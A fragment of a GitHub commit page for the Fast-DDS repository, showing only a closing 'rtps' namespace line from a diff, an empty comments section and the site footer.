|  |  | } // namespace rtps |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `f2e5cea`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FeProsima%2FFast-DDS%2Fcommit%2Ff2e5ceae8fbea0a6c9445a366faaca0b98a8ef86) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


